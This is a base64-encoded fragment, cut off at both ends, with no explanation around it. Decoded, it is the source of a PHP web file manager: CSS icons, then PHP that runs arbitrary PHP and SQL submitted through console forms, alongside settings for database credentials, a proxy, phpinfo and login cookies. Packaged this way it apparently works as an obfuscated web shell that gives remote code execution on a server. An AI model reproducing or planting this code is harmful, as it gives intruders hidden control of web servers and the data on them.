8yeDBtTTAwUDhpZGZBQWV0ejJFVHdHNWZhODdQbm9zdWhZQk95bzhjdHRNSlcrODNkbHYvdElsM0YrYjRDWXlwMlR4dzJWVXdBQUFBQUVsRlRrU3VRbUNDIik7Cn0KCi5maWxlIHsKICAgIGJhY2tncm91bmQtaW1hZ2U6IHVybCgiZGF0YTppbWFnZS9wbmc7YmFzZTY0LGlWQk9SdzBLR2dvQUFBQU5TVWhFVWdBQUFCQUFBQUFRQ0FZQUFBQWY4LzloQUFBS1QybERRMUJRYUc5MGIzTm9iM0FnU1VORElIQnliMlpwYkdVQUFIamFuVk5uVkZQcEZqMzMzdlJDUzRpQWxFdHZVaFVJSUZKQ2k0QVVrU1lxSVFrUVNvZ2hvZGtWVWNFUlJVVUVHOGlnaUFPT2pvQ01GVkVzRElvSzJBZmtJYUtPZzZPSWlzcjc0WHVqYTlhODkrYk4vclhYUHVlczg1Mnp6d2ZBQ0F5V1NETlJOWUFNcVVJZUVlQ0R4OFRHNGVRdVFJRUtKSEFBRUFpelpDRnovU01CQVBoK1BEd3JJc0FIdmdBQmVOTUxDQURBVFp2QU1CeUgvdy9xUXBsY0FZQ0VBY0Iwa1RoTENJQVVBRUI2amtLbUFFQkdBWUNkbUNaVEFLQUVBR0RMWTJMakFGQXRBR0FuZitiVEFJQ2QrSmw3QVFCYmxDRVZBYUNSQUNBVFpZaEVBR2c3QUt6UFZvcEZBRmd3QUJSbVM4UTVBTmd0QURCSlYyWklBTEMzQU1ET0VBdXlBQWdNQURCUmlJVXBBQVI3QUdESUl5TjRBSVNaQUJSRzhsYzg4U3V1RU9jcUFBQjRtYkk4dVNRNVJZRmJDQzF4QjFkWExoNG96a2tYS3hRMllRSmhta0F1d25tWkdUS0JOQS9nODh3QUFLQ1JGUkhnZy9QOWVNNE9yczdPTm82MkRsOHQ2cjhHL3lKaVl1UCs1YytyY0VBQUFPRjBmdEgrTEMrekdvQTdCb0J0L3FJbDdnUm9YZ3VnZGZlTFpySVBRTFVBb09uYVYvTncrSDQ4UEVXaGtMbloyZVhrNU5oS3hFSmJZY3BYZmY1bndsL0FWLzFzK1g0OC9QZjE0TDdpSklFeVhZRkhCUGpnd3N6MFRLVWN6NUlKaEdMYzVvOUgvTGNMLy93ZDB5TEVTV0s1V0NvVTQxRVNjWTVFbW96ek1xVWlpVUtTS2NVbDB2OWs0dDhzK3dNKzN6VUFzR28rQVh1UkxhaGRZd1AyU3ljUVdIVEE0dmNBQVBLN2I4SFVLQWdEZ0dpRDRjOTMvKzgvL1VlZ0pRQ0Faa21TY1FBQVhrUWtMbFRLc3ovSENBQUFSS0NCS3JCQkcvVEJHQ3pBQmh6QkJkekJDL3hnTm9SQ0pNVENRaEJDQ21TQUhISmdLYXlDUWlpR3piQWRLbUF2MUVBZE5NQlJhSWFUY0E0dXdsVzREajF3RC9waENKN0JLTHlCQ1FSQnlBZ1RZU0hhaUFGaWlsZ2pqZ2dYbVlYNEljRklCQktMSkNESmlCUlJJa3VSTlVneFVvcFVJRlZJSGZJOWNnSTVoMXhHdXBFN3lBQXlndnlHdkVjeGxJR3lVVDNVRExWRHVhZzNHb1JHb2d2UVpIUXhtbzhXb0p2UWNyUWFQWXcyb2VmUXEyZ1AybzgrUThjd3dPZ1lCelBFYkRBdXhzTkNzVGdzQ1pOank3RWlyQXlyeGhxd1Zxd0R1NG4xWTgreGR3UVNnVVhBQ1RZRWQwSWdZUjVCU0ZoTVdFN1lTS2dnSENRMEVkb0pOd2tEaEZIQ0p5S1RxRXUwSnJvUitjUVlZakl4aDFoSUxDUFdFbzhUTHhCN2lFUEVOeVFTaVVNeUo3bVFBa214cEZUU0V0SkcwbTVTSStrc3FaczBTQm9qazhuYVpHdXlCem1VTENBcnlJWGtuZVRENURQa0crUWg4bHNLbldKQWNhVDRVK0lvVXNwcVNobmxFT1UwNVFabG1ESkJWYU9hVXQyb29WUVJOWTlhUXEyaHRsS3ZVWWVvRXpSMW1qbk5neFpKUzZXdG9wWFRHbWdYYVBkcHIraDB1aEhkbFI1T2w5Qlgwc3ZwUitpWDZBUDBkd3dOaGhXRHg0aG5LQm1iR0FjWVp4bDNHSytZVEtZWjA0c1p4MVF3TnpIcm1PZVpENWx2VlZncXRpcDhGWkhLQ3BWS2xTYVZHeW92VkttcXBxcmVxZ3RWODFYTFZJK3BYbE45cmtaVk0xUGpxUW5VbHF0VnFwMVE2MU1iVTJlcE82aUhxbWVvYjFRL3BINVovWWtHV2NOTXcwOURwRkdnc1YvanZNWWdDMk1aczNnc0lXc05xNFoxZ1RYRUpySE4yWHgyS3J1WS9SMjdpejJxcWFFNVF6TktNMWV6VXZPVVpqOEg0NWh4K0p4MFRnbm5LS2VYODM2SzNoVHZLZUlwRzZZMFRMa3haVnhycXBhWGxsaXJTS3RScTBmcnZUYXU3YWVkcHIxRnUxbjdnUTVCeDBvblhDZEhaNC9PQlozblU5bFQzYWNLcHhaTlBUcjFyaTZxYTZVYm9idEVkNzl1cCs2WW5yNWVnSjVNYjZmZWViM24raHg5TC8xVS9XMzZwL1ZIREZnR3N3d2tCdHNNemhnOHhUVnhiendkTDhmYjhWRkRYY05BUTZWaGxXR1g0WVNSdWRFOG85VkdqVVlQakduR1hPTWs0MjNHYmNhakpnWW1JU1pMVGVwTjdwcFNUYm1tS2FZN1REdE14ODNNemFMTjFwazFtejB4MXpMbm0rZWIxNXZmdDJCYWVGb3N0cWkydUdWSnN1UmFwbG51dHJ4dWhWbzVXYVZZVlZwZHMwYXRuYTBsMXJ1dHU2Y1JwN2xPazA2cm50Wm53N0R4dHNtMnFiY1pzT1hZQnR1dXRtMjJmV0ZuWWhkbnQ4V3V3KzZUdlpOOXVuMk4vVDBIRFlmWkRxc2RXaDErYzdSeUZEcFdPdDZhenB6dVAzM0Y5SmJwTDJkWXp4RFAyRFBqdGhQTEtjUnBuVk9iMDBkbkYyZTVjNFB6aUl1SlM0TExMcGMrTHBzYnh0M0l2ZVJLZFBWeFhlRjYwdldkbTdPYnd1Mm8yNi91TnU1cDdvZmNuOHcwbnltZVdUTnowTVBJUStCUjVkRS9DNStWTUd2ZnJINVBRMCtCWjdYbkl5OWpMNUZYcmRld3Q2VjNxdmRoN3hjKzlqNXluK00rNHp3MzNqTGVXVi9NTjhDM3lMZkxUOE52bmwrRjMwTi9JLzlrLzNyLzBRQ25nQ1VCWndPSmdVR0JXd0w3K0hwOEliK09QenJiWmZheTJlMUJqS0M1UVJWQmo0S3RndVhCclNGb3lPeVFyU0gzNTVqT2tjNXBEb1ZRZnVqVzBBZGg1bUdMdzM0TUo0V0hoVmVHUDQ1d2lGZ2EwVEdYTlhmUjNFTnozMFQ2UkpaRTNwdG5NVTg1cnkxS05TbytxaTVxUE5vM3VqUzZQOFl1WmxuTTFWaWRXRWxzU3h3NUxpcXVObTVzdnQvODdmT0g0cDNpQytON0Y1Z3Z5RjF3ZWFIT3d2U0ZweGFwTGhJc09wWkFUSWhPT0pUd1FSQXFxQmFNSmZJVGR5V09Dbm5DSGNKbklpL1JOdEdJMkVOY0toNU84a2dxVFhxUzdKRzhOWGtreFRPbExPVzVoQ2Vwa0x4TURVemRtenFlRnBwMklHMHlQVHE5TVlPU2taQnhRcW9oVFpPMlorcG41bVoyeTZ4bGhiTCt4VzZMdHk4ZWxRZkphN09RckFWWkxRcTJRcWJvVkZvbzF5b0hzbWRsVjJhL3pZbktPWmFybml2TjdjeXp5dHVRTjV6dm4vL3RFc0lTNFpLMnBZWkxWeTBkV09hOXJHbzVzanh4ZWRzSzR4VUZLNFpXQnF3OHVJcTJLbTNWVDZ2dFY1ZXVmcjBtZWsxcmdWN0J5b0xCdFFGcjZ3dFZDdVdGZmV2YzErMWRUMWd2V2QrMVlmcUduUnMrRlltS3JoVGJGNWNWZjlnbzNIamxHNGR2eXIrWjNKUzBxYXZFdVdUUFp0Sm02ZWJlTFo1YkRwYXFsK2FYRG00TjJkcTBEZDlXdE8zMTlrWGJMNWZOS051N2c3WkR1YU8vUExpOFphZkp6czA3UDFTa1ZQUlUrbFEyN3RMZHRXSFgrRzdSN2h0N3ZQWTA3TlhiVzd6My9UN0p2dHRWQVZWTjFXYlZaZnRKKzdQM1A2NkpxdW40bHZ0dFhhMU9iWEh0eHdQU0EvMEhJdzYyMTduVTFSM1NQVlJTajlZcjYwY094eCsrL3AzdmR5ME5OZzFWalp6RzRpTndSSG5rNmZjSjMvY2VEVHJhZG94N3JPRUgweDkySFdjZEwycENtdkthUnB0VG12dGJZbHU2VDh3KzBkYnEzbnI4UjlzZkQ1dzBQRmw1U3ZOVXlXbmE2WUxUazJmeXo0eWRsWjE5Zmk3NTNHRGJvclo3NTJQTzMyb1BiKys2RUhUaDBrWC9pK2M3dkR2T1hQSzRkUEt5MitVVFY3aFhtcTg2WDIzcWRPbzgvcFBUVDhlN25MdWFycmxjYTdudWVyMjFlMmIzNlJ1ZU44N2Q5TDE1OFJiLzF0V2VPVDNkdmZONmIvZkY5L1hmRnQxK2NpZjl6c3U3MlhjbjdxMjhUN3hmOUVEdFFkbEQzWWZWUDF2KzNOanYzSDlxd0hlZzg5SGNSL2NHaFlQUC9wSDFqdzlEQlkrWmo4dUdEWWJybmpnK09UbmlQM0w5NmZ5blE4OWt6eWFlRi82aS9zdXVGeFl2ZnZqVjY5Zk8wWmpSb1pmeWw1Ty9iWHlsL2VyQTZ4bXYyOGJDeGg2K3lYZ3pNVjcwVnZ2dHdYZmNkeDN2bzk4UFQrUjhJSDhvLzJqNXNmVlQwS2Y3a3htVGsvOEVBNWp6L0dNekxkc0FBQUFHWWt0SFJBRC9BUDhBLzZDOXA1TUFBQUFKY0VoWmN3QUFDeE1BQUFzVEFRQ2FuQmdBQUFBSGRFbE5SUWZjQ0F3R01UZzVYRUVUQUFBQjhrbEVRVlE0eTNXU01XL1RRQmlHbisrN3N4M1hkZE1BSW0wbmtDb2hSUWlKRFNFeGRBbC9BVEV3SVBFemtGaVlZR1JseU15R3hNTEV4RmhCeXk5QUNBYWEwZ1luRG9sOXg5RFlpVnM0NmRQbmsvdys5OTczbmdESi92NysreUFJQ2orZkkwSEEvNVp6RHU4OXpqbU9qbzZ5ZnIvL3dBSkJyOWU3RzRZaHhXU0NSRkg5MDJxVlpkbll4M0Y4RElRV0lNc3kxcElFWHhTb01mVko1MEZlREtVcmNHY3dBVkNBTkUxcHRWcW9LcXFLTWFiK3J2Wmh2TWJuMXkvd2c2ZEl0SWFJQUdBQlRrNU9TSklFOVI0QUVVRlZjYzdWUGY5MndQYnRsSHozQ1J0K2pxcFNPMmkzMjhSeFhOdGVoWWdJcHJYTytPTnpybDMrZ3RFQUVXMENoc01oV1pZMTdsNURqT1gwMHh1dTdvejVFVDNrVW1lakJ0ZUFUcWRESE1ld0VLOUNQREEvZk1WczZ4YWIyM3RuSXYySGcvRjQzSnk0OTRnTkdINTRTZmZHQnFmcmowbGFTM0hEUVpxbWhHR0lXOFJXeGZmbitEdjI1MXQrdGUvUjNlbmhFVVNXVlFOR294RjVudU5YeEtLR3J3ZnZDSGJ2NEs4OHdtaUo2bkt3alJpaktNSVlRem1mSTR2b1JJUWkzdVozOXo1Ym01MHphSFhxNHY0MVlEcWRnZ2hTbG9oekFNeW1PZGR2N21HTVVKWmxJOVpxd0UwSHFvaTFGMTVoSlZydEN4ZStBa2dZaGdUV0lzWmdvZ2dSd1ZwN1lXQ3J5eGlqRldBeUdBeWVJVktvY3lMVzFvK282dWNMOEhtZXo0RHhYKzhkQUxHN01lVlVBQUFBQUVsRlRrU3VRbUNDIik7Cn0KPD89Zm1faG9tZV9zdHlsZSgpPz4KLmltZyB7CgliYWNrZ3JvdW5kLWltYWdlOiAKdXJsKCJkYXRhOmltYWdlL3BuZztiYXNlNjQsaVZCT1J3MEtHZ29BQUFBTlNVaEVVZ0FBQUJBQUFBQVFDQU1BQUFBb0xROVRBQUFBQkdkQlRVRUFBSy9JTndXSzZRQUFBZEZRVEZSRjdlM3QvZjM5cEorZitjSmFqVjhxNmVucGtHSW0vc0ZPLysyTzM5M2M1dWJtL3N4YmQyOXlpbWRuZUZnNjVPVGsyem9ZNnVIaTF6QVMxY3JKc0hzMm55Z28zTnJiMkxCWHJZdG0ycDVBLytoWHBvUnFwS09rd3JpNDYrdnIwTUczNllzejZ1anBtSTZBbnpVeXdMKy9tWFZTbUlCTjhid3dqMVZCeUxHemExWkowTkRRallTQi85Tmp3WjZDd1VBc3hrMGJyWnlXdzdwbUdaNEE2THRka0hkZi8rTjh5b3cyN2I1Vzg3Uk5MWkwvMmJpUDd3QUEvL0dKbDVlWDROZllzYWFMZ3A2aDFiK3QvKzZSNjhGZTg5eWNpbVpkL3VRdjNyOU51cENCOTlWMjVhMWNWSmJibkhoTy84eFMrTUJhOGZEd2kySmk0OHFpLytxT2RWSXpzMzR4Ly9HT1hJellwNVNQL3N4Z3FwaUljcCsvc2lRcGNtcHN0YXlzelNBTnVLS1Q5UFQwNHVMaXdJa3k4TGRFK3NWV3ZxYW04ZS92TDVJWitybEg4Y05nMDhDY3o3YWQ4dkx5OUx0VTFxeVV1WjQrcjUxMis4cy93VXBMM2QzZHg3VzFmR05hLzg5WjJjZkgrczVuNk9qb2IxWXRzN0t6MTlmWHdJZzRwMWROK1BqNHpMUjArOHBkN3N0cmhLQXMvOWhqLzlCVjFLdGZ0TFMxbnAyZFlsSlNaRlZWNUxSV2hFRkI1cmhaLzlKcTBIdFQvL0NTa0lxSjZLNUQrTE5OYmxWVnZqTTA0N1pNejdlMzF4RUcvLy8vdEtndTZ3QUFBSnQwVWs1VC8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy93Q1ZWcEtZQUFBQUdYUkZXSFJUYjJaMGQyRnlaUUJCWkc5aVpTQkpiV0ZuWlZKbFlXUjVjY2xsUEFBQUFOWkpSRUZVS0ZOam1LV2lQUXNaTU14aW1zcVBLcEFiMk1zQVpOakxPd2t6Z2dWbUpZbnlwcy9RRTU5ZUtDRXRCaGFZRlJmalp1VGhIMjdsWTZrcUJ4WW9yUy9PTUM1d2lIWmtsMlFDQ1ZUa04rdHJ0Rmo0WlNwTW1hd0RGQkQwbENveW56WkJsMW5JSmo1NUVsQkEwOXBkdmM5YnVUMVNZS1lCV3cxUUlDMG9OWXNqckZISnBTa3ZSWXNCS0NDYk05SExOOXRXcmJxbmpVVUdaRzFBaEd1SVhaUnpwUWwzYUd3RDJCMmNaWjJ6RW9MN1crdTZxeUF1blpYSU9NdlFyRnlrcXdUaUZ6QlFOT1hqNFFLem9BS3phanRZSVF3QWx2dHBsM1Y1YzhNQUFBQUFTVVZPUks1Q1lJST0iKTsKfQpAbWVkaWEgc2NyZWVuIGFuZCAobWF4LXdpZHRoOjcyMHB4KXsKICB0YWJsZXtkaXNwbGF5OmJsb2NrO30KICAgICNmbV90YWJsZSB0ZHtkaXNwbGF5OmlubGluZTtmbG9hdDpsZWZ0O30KICAgICNmbV90YWJsZSB0Ym9keSB0ZDpmaXJzdC1jaGlsZHt3aWR0aDoxMDAlO3BhZGRpbmc6MDt9CiAgICAjZm1fdGFibGUgdGJvZHkgdHI6bnRoLWNoaWxkKDJuKzEpe2JhY2tncm91bmQtY29sb3I6I0VGRUZFRjt9CiAgICAjZm1fdGFibGUgdGJvZHkgdHI6bnRoLWNoaWxkKDJuKXtiYWNrZ3JvdW5kLWNvbG9yOiNERUUzRTc7fQogICAgI2ZtX3RhYmxlIHRye2Rpc3BsYXk6YmxvY2s7ZmxvYXQ6bGVmdDtjbGVhcjpsZWZ0O3dpZHRoOjEwMCU7fQoJI2hlYWRlcl90YWJsZSAucm93MiwgI2hlYWRlcl90YWJsZSAucm93MyB7ZGlzcGxheTppbmxpbmU7ZmxvYXQ6bGVmdDt3aWR0aDoxMDAlO3BhZGRpbmc6MDt9CgkjaGVhZGVyX3RhYmxlIHRhYmxlIHRkIHtkaXNwbGF5OmlubGluZTtmbG9hdDpsZWZ0O30KfQo8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5Pgo8P3BocAokdXJsX2luYyA9ICc/Zm09dHJ1ZSc7CmlmIChpc3NldCgkX1BPU1RbJ3NxbHJ1biddKSYmIWVtcHR5KCRmbV9jb25maWdbJ2VuYWJsZV9zcWxfY29uc29sZSddKSl7CgkkcmVzID0gZW1wdHkoJF9QT1NUWydzcWwnXSkgPyAnJyA6ICRfUE9TVFsnc3FsJ107CgkkcmVzX2xuZyA9ICdzcWwnOwp9IGVsc2VpZiAoaXNzZXQoJF9QT1NUWydwaHBydW4nXSkmJiFlbXB0eSgkZm1fY29uZmlnWydlbmFibGVfcGhwX2NvbnNvbGUnXSkpewoJJHJlcyA9IGVtcHR5KCRfUE9TVFsncGhwJ10pID8gJycgOiAkX1BPU1RbJ3BocCddOwoJJHJlc19sbmcgPSAncGhwJzsKfSAKaWYgKGlzc2V0KCRfR0VUWydmbV9zZXR0aW5ncyddKSkgewoJZWNobyAnIAo8dGFibGUgY2xhc3M9Indob2xlIj4KPGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249IiI+Cjx0cj48dGggY29sc3Bhbj0iMiI+Jy5fXygnRmlsZSBtYW5hZ2VyJykuJyAtICcuX18oJ1NldHRpbmdzJykuJzwvdGg+PC90cj4KJy4oZW1wdHkoJG1zZyk/Jyc6Jzx0cj48dGQgY2xhc3M9InJvdzIiIGNvbHNwYW49IjIiPicuJG1zZy4nPC90ZD48L3RyPicpLicKJy5mbV9jb25maWdfY2hlY2tib3hfcm93KF9fKCdTaG93IHNpemUgb2YgdGhlIGZvbGRlcicpLCdzaG93X2Rpcl9zaXplJykuJwonLmZtX2NvbmZpZ19jaGVja2JveF9yb3coX18oJ1Nob3cnKS4nICcuX18oJ3BpY3R1cmVzJyksJ3Nob3dfaW1nJykuJwonLmZtX2NvbmZpZ19jaGVja2JveF9yb3coX18oJ1Nob3cnKS4nICcuX18oJ01ha2UgZGlyZWN0b3J5JyksJ21ha2VfZGlyZWN0b3J5JykuJwonLmZtX2NvbmZpZ19jaGVja2JveF9yb3coX18oJ1Nob3cnKS4nICcuX18oJ05ldyBmaWxlJyksJ25ld19maWxlJykuJwonLmZtX2NvbmZpZ19jaGVja2JveF9yb3coX18oJ1Nob3cnKS4nICcuX18oJ1VwbG9hZCcpLCd1cGxvYWRfZmlsZScpLicKJy5mbV9jb25maWdfY2hlY2tib3hfcm93KF9fKCdTaG93JykuJyBQSFAgdmVyc2lvbicsJ3Nob3dfcGhwX3ZlcicpLicKJy5mbV9jb25maWdfY2hlY2tib3hfcm93KF9fKCdTaG93JykuJyBQSFAgaW5pJywnc2hvd19waHBfaW5pJykuJwonLmZtX2NvbmZpZ19jaGVja2JveF9yb3coX18oJ1Nob3cnKS4nICcuX18oJ0dlbmVyYXRpb24gdGltZScpLCdzaG93X2d0JykuJwonLmZtX2NvbmZpZ19jaGVja2JveF9yb3coX18oJ1Nob3cnKS4nIHhscycsJ3Nob3dfeGxzJykuJwonLmZtX2NvbmZpZ19jaGVja2JveF9yb3coX18oJ1Nob3cnKS4nIFBIUCAnLl9fKCdDb25zb2xlJyksJ2VuYWJsZV9waHBfY29uc29sZScpLicKJy5mbV9jb25maWdfY2hlY2tib3hfcm93KF9fKCdTaG93JykuJyBTUUwgJy5fXygnQ29uc29sZScpLCdlbmFibGVfc3FsX2NvbnNvbGUnKS4nCjx0cj48dGQgY2xhc3M9InJvdzEiPjxpbnB1dCBuYW1lPSJmbV9jb25maWdbc3FsX3NlcnZlcl0iIHZhbHVlPSInLiRmbV9jb25maWdbJ3NxbF9zZXJ2ZXInXS4nIiB0eXBlPSJ0ZXh0Ij48L3RkPjx0ZCBjbGFzcz0icm93MiB3aG9sZSI+U1FMIHNlcnZlcjwvdGQ+PC90cj4KPHRyPjx0ZCBjbGFzcz0icm93MSI+PGlucHV0IG5hbWU9ImZtX2NvbmZpZ1tzcWxfdXNlcm5hbWVdIiB2YWx1ZT0iJy4kZm1fY29uZmlnWydzcWxfdXNlcm5hbWUnXS4nIiB0eXBlPSJ0ZXh0Ij48L3RkPjx0ZCBjbGFzcz0icm93MiB3aG9sZSI+U1FMIHVzZXI8L3RkPjwvdHI+Cjx0cj48dGQgY2xhc3M9InJvdzEiPjxpbnB1dCBuYW1lPSJmbV9jb25maWdbc3FsX3Bhc3N3b3JkXSIgdmFsdWU9IicuJGZtX2NvbmZpZ1snc3FsX3Bhc3N3b3JkJ10uJyIgdHlwZT0idGV4dCI+PC90ZD48dGQgY2xhc3M9InJvdzIgd2hvbGUiPlNRTCBwYXNzd29yZDwvdGQ+PC90cj4KPHRyPjx0ZCBjbGFzcz0icm93MSI+PGlucHV0IG5hbWU9ImZtX2NvbmZpZ1tzcWxfZGJdIiB2YWx1ZT0iJy4kZm1fY29uZmlnWydzcWxfZGInXS4nIiB0eXBlPSJ0ZXh0Ij48L3RkPjx0ZCBjbGFzcz0icm93MiB3aG9sZSI+U1FMIERCPC90ZD48L3RyPgonLmZtX2NvbmZpZ19jaGVja2JveF9yb3coX18oJ1Nob3cnKS4nIFByb3h5JywnZW5hYmxlX3Byb3h5JykuJwonLmZtX2NvbmZpZ19jaGVja2JveF9yb3coX18oJ1Nob3cnKS4nIHBocGluZm8oKScsJ3Nob3dfcGhwaW5mbycpLicKJy5mbV9jb25maWdfY2hlY2tib3hfcm93KF9fKCdTaG93JykuJyAnLl9fKCdTZXR0aW5ncycpLCdmbV9zZXR0aW5ncycpLicKJy5mbV9jb25maWdfY2hlY2tib3hfcm93KF9fKCdSZXN0b3JlIGZpbGUgdGltZSBhZnRlciBlZGl0aW5nJyksJ3Jlc3RvcmVfdGltZScpLicKJy5mbV9jb25maWdfY2hlY2tib3hfcm93KF9fKCdGaWxlIG1hbmFnZXInKS4nOiAnLl9fKCdSZXN0b3JlIGZpbGUgdGltZSBhZnRlciBlZGl0aW5nJyksJ2ZtX3Jlc3RvcmVfdGltZScpLicKPHRyPjx0ZCBjbGFzcz0icm93MyI+PGEgaHJlZj0iJy5mbV91cmwoKS4nP2ZtX3NldHRpbmdzPXRydWUmZm1fY29uZmlnX2RlbGV0ZT10cnVlIj4nLl9fKCdSZXNldCBzZXR0aW5ncycpLic8L2E+PC90ZD48dGQgY2xhc3M9InJvdzMiPjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSInLl9fKCdTYXZlJykuJyIgbmFtZT0iZm1fY29uZmlnW2ZtX3NldF9zdWJtaXRdIj48L3RkPjwvdHI+CjwvZm9ybT4KPC90YWJsZT4KPHRhYmxlPgo8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iIj4KPHRyPjx0aCBjb2xzcGFuPSIyIj4nLl9fKCdTZXR0aW5ncycpLicgLSAnLl9fKCdBdXRob3JpemF0aW9uJykuJzwvdGg+PC90cj4KPHRyPjx0ZCBjbGFzcz0icm93MSI+PGlucHV0IG5hbWU9ImZtX2xvZ2luW2F1dGhvcml6ZV0iIHZhbHVlPSIxIiAnLigkYXV0aFsnYXV0aG9yaXplJ10/J2NoZWNrZWQnOicnKS4nIHR5cGU9ImNoZWNrYm94IiBpZD0iYXV0aCI+PC90ZD48dGQgY2xhc3M9InJvdzIgd2hvbGUiPjxsYWJlbCBmb3I9ImF1dGgiPicuX18oJ0F1dGhvcml6YXRpb24nKS4nPC9sYWJlbD48L3RkPjwvdHI+Cjx0cj48dGQgY2xhc3M9InJvdzEiPjxpbnB1dCBuYW1lPSJmbV9sb2dpbltsb2dpbl0iIHZhbHVlPSInLiRhdXRoWydsb2dpbiddLiciIHR5cGU9InRleHQiPjwvdGQ+PHRkIGNsYXNzPSJyb3cyIHdob2xlIj4nLl9fKCdMb2dpbicpLic8L3RkPjwvdHI+Cjx0cj48dGQgY2xhc3M9InJvdzEiPjxpbnB1dCBuYW1lPSJmbV9sb2dpbltwYXNzd29yZF0iIHZhbHVlPSInLiRhdXRoWydwYXNzd29yZCddLiciIHR5cGU9InRleHQiPjwvdGQ+PHRkIGNsYXNzPSJyb3cyIHdob2xlIj4nLl9fKCdQYXNzd29yZCcpLic8L3RkPjwvdHI+Cjx0cj48dGQgY2xhc3M9InJvdzEiPjxpbnB1dCBuYW1lPSJmbV9sb2dpbltjb29raWVfbmFtZV0iIHZhbHVlPSInLiRhdXRoWydjb29raWVfbmFtZSddLiciIHR5cGU9InRleHQiPjwvdGQ+PHRkIGNsYXNzPSJyb3cyIHdob2xlIj4nLl9fKCdDb29raWUnKS4nPC90ZD48L3RyPgo8dHI+PHRkIGNsYXNzPSJyb3cxIj48aW5wdXQgbmFtZT0iZm1fbG9naW5bZGF5c19hdXRob3JpemF0aW9uXSIgdmFsdWU9IicuJGF1dGhbJ2RheXNfYXV0aG9yaXphdGlvbiddLiciIHR5cGU9InRleHQiPjwvdGQ+PHRkIGNsYXNzPSJyb3cyIHdob2xlIj4nLl9fKCdEYXlzJykuJzwvdGQ+PC90cj4KPHRyPjx0ZCBjbGFzcz0icm93MSI+PHRleHRhcmVhIG5hbWU9ImZtX2xvZ2luW3NjcmlwdF0iIGNvbHM9IjM1IiByb3dzPSI3IiBjbGFzcz0idGV4dGFyZWFfaW5wdXQiIGlkPSJhdXRoX3NjcmlwdCI+Jy4kYXV0aFsnc2NyaXB0J10uJzwvdGV4dGFyZWE+PC90ZD48dGQgY2xhc3M9InJvdzIgd2hvbGUiPicuX18oJ1NjcmlwdCcpLic8L3RkPjwvdHI+Cjx0cj48dGQgY29sc3Bhbj0iMiIgY2xhc3M9InJvdzMiPjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSInLl9fKCdTYXZlJykuJyIgPjwvdGQ+PC90cj4KPC9mb3JtPgo8L3RhYmxlPic7CmVjaG8gZm1fdHBsX2Zvcm0oJ3BocCcpLGZtX3RwbF9mb3JtKCdzcWwnKTsKfSBlbHNlaWYgKGlzc2V0KCRwcm94eV9mb3JtKSkgewoJZGllKCRwcm94eV9mb3JtKTsKfSBlbHNlaWYgKGlzc2V0KCRyZXNfbG5nKSkgewkKPz4KPHRhYmxlIGNsYXNzPSJ3aG9sZSI+Cjx0cj4KICAgIDx0aD48Pz1fXygnRmlsZSBtYW5hZ2VyJykuJyAtICcuJHBhdGg/PjwvdGg+CjwvdHI+Cjx0cj4KICAgIDx0ZCBjbGFzcz0icm93MiI+PHRhYmxlPjx0cj48dGQ+PGgyPjw/PXN0cnRvdXBwZXIoJHJlc19sbmcpPz4gPD89X18oJ0NvbnNvbGUnKT8+PD9waHAKCWlmKCRyZXNfbG5nPT0nc3FsJykgZWNobyAnIC0gRGF0YWJhc2U6ICcuJGZtX2NvbmZpZ1snc3FsX2RiJ10uJzwvaDI+PC90ZD48dGQ+Jy5mbV9ydW5faW5wdXQoJ3BocCcpOwoJZWxzZSBlY2hvICc8L2gyPjwvdGQ+PHRkPicuZm1fcnVuX2lucHV0KCdzcWwnKTsKCT8+PC90ZD48L3RyPjwvdGFibGU+PC90ZD4KPC90cj4KPHRyPgogICAgPHRkIGNsYXNzPSJyb3cxIj4KCQk8YSBocmVmPSI8Pz0kdXJsX2luYy4nJnBhdGg9JyAuICRwYXRoOz8+Ij48Pz1fXygnQmFjaycpPz48L2E+CgkJPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0iUE9TVCIgbmFtZT0iY29uc29sZSI+CgkJPHRleHRhcmVhIG5hbWU9Ijw/PSRyZXNfbG5nPz4iIGNvbHM9IjgwIiByb3dzPSIxMCIgc3R5bGU9IndpZHRoOiA5MCUiPjw/PSRyZXM/PjwvdGV4dGFyZWE+PGJyLz4KCQk8aW5wdXQgdHlwZT0icmVzZXQiIHZhbHVlPSI8Pz1fXygnUmVzZXQnKT8+Ij4KCQk8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iPD89X18oJ1N1Ym1pdCcpPz4iIG5hbWU9Ijw/PSRyZXNfbG5nPz5ydW4iPgo8P3BocAokc3RyX3RtcGwgPSAkcmVzX2xuZy4nX3RlbXBsYXRlcyc7CiR0bXBsID0gIWVtcHR5KCQkc3RyX3RtcGwpID8ganNvbl9kZWNvZGUoJCRzdHJfdG1wbCx0cnVlKSA6ICcnOwppZiAoIWVtcHR5KCR0bXBsKSl7CgkkYWN0aXZlID0gaXNzZXQoJF9QT1NUWyRyZXNfbG5nLidfdHBsJ10pID8gJF9QT1NUWyRyZXNfbG5nLidfdHBsJ10gOiAnJzsKCSRzZWxlY3QgPSAnPHNlbGVjdCBuYW1lPSInLiRyZXNfbG5nLidfdHBsIiB0aXRsZT0iJy5fXygnVGVtcGxhdGUnKS4nIiBvbmNoYW5nZT0iaWYgKHRoaXMudmFsdWUhPS0xKSBkb2N1bWVudC5mb3Jtc1tcJ2NvbnNvbGVcJ10uZWxlbWVudHNbXCcnLiRyZXNfbG5nLidcJ10udmFsdWUgPSB0aGlzLm9wdGlvbnNbc2VsZWN0ZWRJbmRleF0udmFsdWU7IGVsc2UgZG9jdW1lbnQuZm9ybXNbXCdjb25zb2xlXCddLmVsZW1lbnRzW1wnJy4kcmVzX2xuZy4nXCddLnZhbHVlID1cJ1wnOyIgPicuIlxuIjsKCSRzZWxlY3QgLj0gJzxvcHRpb24gdmFsdWU9Ii0xIj4nIC4gX18oJ1NlbGVjdCcpIC4gIjwvb3B0aW9uPlxuIjsKC